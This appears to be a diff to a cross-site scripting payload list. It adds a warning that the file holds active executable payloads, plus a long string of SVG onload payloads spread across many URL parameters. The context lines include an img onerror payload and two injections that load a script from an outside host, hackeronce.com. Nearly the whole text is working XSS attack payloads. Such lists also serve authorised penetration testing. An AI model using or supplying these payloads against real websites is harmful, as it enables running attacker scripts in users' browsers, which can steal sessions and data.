@@ -1,3 +1,4 @@
+<!-- WARNING: This file contains active, executable XSS payloads. Use with caution. -->
 <noscript><p title =" </noscript> <img src=x onerror=alert(document.domain);//“>
 
 
@@ -34,3 +35,6 @@ Create Element
 javascript:eval('var a=document.createElement(\'script\');a.src=\'//1.hackeronce.com\';document.body.appendChild(a)')
 Plain JS
 document.head.appendChild(Object.assign(document.createElement('script'),{src:'//1.hackeronce.com'}));
+
+Multi-parameter SVG onload payloads
+'>"<svg%2Fonload=confirm('xss-name')>&json='>"<svg%2Fonload=confirm('xss-json')>&id_base='>"<svg%2Fonload=confirm('xss-id_base')>&where='>"<svg%2Fonload=confirm('xss-where')>&request='>"<svg%2Fonload=confirm('xss-request')>&notes='>"<svg%2Fonload=confirm('xss-notes')>&img='>"<svg%2Fonload=confirm('xss-img')>&a='>"<svg%2Fonload=confirm('xss-a')>&menu-item='>"<svg%2Fonload=confirm('xss-menu-item')>&xml='>"<svg%2Fonload=confirm('xss-xml')>&columns='>"<svg%2Fonload=confirm('xss-columns')>&service='>"<svg%2Fonload=confirm('xss-service')>&site_id='>"<svg%2Fonload=confirm('xss-site_id')> [xss_param="name='>"<svg%2Fonload=confirm('xss-name')>&json='>"<svg%2Fonload=confirm('xss-json')>&id_base='>"<svg%2Fonload=confirm('xss-id_base')>&where='>"<svg%2Fonload=confirm('xss-where')>&request='>"<svg%2Fonload=confirm('xss-request')>&notes='>"<svg%2Fonload=confirm('xss-notes')>&img='>"<svg%2Fonload=confirm('xss-img')>&a='>"<svg%2Fonload=confirm('xss-a')>&menu-item='>"<svg%2Fonload=confirm('xss-menu-item')>&xml='>"<svg%2Fonload=confirm('xss-xml')>&columns='>"<svg%2Fonload=confirm('xss-columns')>&service='>"<svg%2Fonload=confirm('xss-service')>&site_id='>"<svg%2Fonload=confirm('xss-site_id')>
